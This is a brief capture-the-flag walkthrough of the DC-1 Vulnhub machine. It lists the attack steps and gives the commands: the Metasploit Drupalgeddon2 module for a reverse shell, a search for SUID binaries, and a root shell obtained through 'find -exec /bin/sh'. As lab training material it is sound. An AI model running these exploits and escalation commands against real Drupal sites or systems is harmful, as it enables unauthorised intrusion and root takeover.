## Vulnhub Walkthrough

**Penetrating Methodology:**

- IP Discovery using netdiscover
- Network scanning (Nmap)
- Surfing HTTPS service port (80)
- Finding Drupal CMS
- Exploiting Drupalgeddon2 to get a reverse shell
- Finding files with SUID bit set
- Finding the “find” command with SUID bit set
- Getting root shell with “find” command
- Getting final flag

`use exploit/unix/webapp/drupal_drupalgeddon2`

`find / -perm -u=s -type f 2>/dev/null`

`locate /usr/bin/find`

`touch raj`

`find raj -exec "whoami" \;` [^1]

`find raj -exec "/bin/sh" \;`

[原文](https://www.hackingarticles.in/dc-1-vulnhub-walkthrough/)

---

[^1]: As “find” command has SUID bit set, we can execute the command as “root” user. We create a file called “raj” and use “find” command to check if is executing the commands as root user, the reason for creating a file is so that we can use with “find” command. As running it with a single file will run the command only once.